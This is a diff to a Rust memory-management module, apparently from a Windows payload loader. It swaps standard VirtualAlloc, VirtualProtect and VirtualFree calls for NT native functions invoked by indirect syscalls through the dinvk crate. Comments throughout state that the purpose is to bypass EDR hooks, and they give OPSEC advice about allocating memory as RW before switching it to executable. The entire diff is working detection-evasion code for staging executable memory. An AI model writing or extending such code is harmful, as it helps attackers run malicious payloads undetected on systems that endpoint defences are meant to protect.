@@ -6,9 +6,9 @@
 use std::error::Error;
 
 #[cfg(target_os = "windows")]
-use winapi::um::memoryapi::{VirtualAlloc, VirtualFree, VirtualProtect};
+use std::ffi::c_void;
 #[cfg(target_os = "windows")]
-use winapi::um::winnt::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
+use dinvk::winapis::{NtAllocateVirtualMemory, NtProtectVirtualMemory, NtFreeVirtualMemory, NtCurrentProcess};
 
 /// Memory region handle for cleanup
 pub struct MemoryRegion {
@@ -35,19 +35,29 @@ impl MemoryRegion {
 
 impl Drop for MemoryRegion {
     /// Automatically frees memory when the region goes out of scope
+    /// Uses indirect syscall via dinvk for EDR evasion
     fn drop(&mut self) {
         #[cfg(target_os = "windows")]
         unsafe {
             if !self.address.is_null() {
-                VirtualFree(self.address as *mut _, 0, MEM_RELEASE);
+                let mut base = self.address as *mut c_void;
+                let mut size = self.size;
+                // Use NtFreeVirtualMemory via dinvk
+                let _ = NtFreeVirtualMemory(
+                    NtCurrentProcess(),
+                    &mut base,
+                    &mut size,
+                    0x8000, // MEM_RELEASE
+                );
             }
         }
     }
 }
 
-/// Allocates memory as RW (PAGE_READWRITE)
+/// Allocates memory as RW (PAGE_READWRITE) using indirect syscall
 ///
 /// **OPSEC**: Allocating as RW first is less suspicious than direct RWX
+/// Uses indirect syscall via dinvk to bypass EDR hooks
 ///
 /// # Arguments
 ///
@@ -60,18 +70,23 @@ impl Drop for MemoryRegion {
 #[cfg(target_os = "windows")]
 pub fn allocate_rw(size: usize) -> Result<MemoryRegion, Box<dyn Error>> {
     unsafe {
-        let addr = VirtualAlloc(
-            std::ptr::null_mut(),
-            size,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE,
+        let mut base_address: *mut c_void = std::ptr::null_mut();
+        let mut region_size = size;
+        
+        let status = NtAllocateVirtualMemory(
+            NtCurrentProcess(),
+            &mut base_address,
+            0,
+            &mut region_size,
+            0x3000, // MEM_COMMIT | MEM_RESERVE
+            0x04,   // PAGE_READWRITE
         );
 
-        if addr.is_null() {
-            return Err("VirtualAlloc failed".into());
+        if status < 0 || base_address.is_null() {
+            return Err("NtAllocateVirtualMemory failed".into());
         }
 
-        Ok(MemoryRegion::new(addr as *mut u8, size))
+        Ok(MemoryRegion::new(base_address as *mut u8, region_size))
     }
 }
 
@@ -81,9 +96,10 @@ pub fn allocate_rw(_size: usize) -> Result<MemoryRegion, Box<dyn Error>> {
     Err("Non-Windows allocation not yet implemented".into())
 }
 
-/// Transitions memory from RW to RX (PAGE_EXECUTE_READ)
+/// Transitions memory from RW to RX (PAGE_EXECUTE_READ) using indirect syscall
 ///
 /// **OPSEC**: RW → RX transition is standard practice and less suspicious than RWX
+/// Uses indirect syscall via dinvk to bypass EDR hooks
 ///
 /// # Arguments
 ///
@@ -96,16 +112,20 @@ pub fn allocate_rw(_size: usize) -> Result<MemoryRegion, Box<dyn Error>> {
 #[cfg(target_os = "windows")]
 pub fn transition_rx(region: &MemoryRegion) -> Result<(), Box<dyn Error>> {
     unsafe {
-        let mut old_protect = 0u32;
-        let result = VirtualProtect(
-            region.address() as *mut _,
-            region.size(),
-            PAGE_EXECUTE_READ,
+        let mut base = region.address() as *mut c_void;
+        let mut size = region.size();
+        let mut old_protect: u32 = 0;
+
+        let status = NtProtectVirtualMemory(
+            NtCurrentProcess(),
+            &mut base,
+            &mut size,
+            0x20, // PAGE_EXECUTE_READ
             &mut old_protect,
         );
 
-        if result == 0 {
-            return Err("VirtualProtect failed".into());
+        if status < 0 {
+            return Err("NtProtectVirtualMemory failed".into());
         }
 
         Ok(())
@@ -117,29 +137,33 @@ pub fn transition_rx(_region: &MemoryRegion) -> Result<(), Box<dyn Error>> {
     Err("Non-Windows memory protection not yet implemented".into())
 }
 
-/// Allocates memory as RWX (PAGE_EXECUTE_READWRITE) - Less OPSEC friendly
+/// Allocates memory as RWX (PAGE_EXECUTE_READWRITE) using indirect syscall
 ///
 /// **Note**: Direct RWX allocation is more suspicious and may trigger alerts
 /// Prefer allocate_rw() + transition_rx() instead
 ///
 /// This function exists for compatibility but should be avoided in production
+/// Uses indirect syscall via dinvk to bypass EDR hooks
 #[cfg(target_os = "windows")]
 pub fn allocate_rwx(size: usize) -> Result<MemoryRegion, Box<dyn Error>> {
-    use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
-
     unsafe {
-        let addr = VirtualAlloc(
-            std::ptr::null_mut(),
-            size,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE,
+        let mut base_address: *mut c_void = std::ptr::null_mut();
+        let mut region_size = size;
+        
+        let status = NtAllocateVirtualMemory(
+            NtCurrentProcess(),
+            &mut base_address,
+            0,
+            &mut region_size,
+            0x3000, // MEM_COMMIT | MEM_RESERVE
+            0x40,   // PAGE_EXECUTE_READWRITE
         );
 
-        if addr.is_null() {
-            return Err("VirtualAlloc RWX failed".into());
+        if status < 0 || base_address.is_null() {
+            return Err("NtAllocateVirtualMemory RWX failed".into());
         }
 
-        Ok(MemoryRegion::new(addr as *mut u8, size))
+        Ok(MemoryRegion::new(base_address as *mut u8, region_size))
     }
 }
 
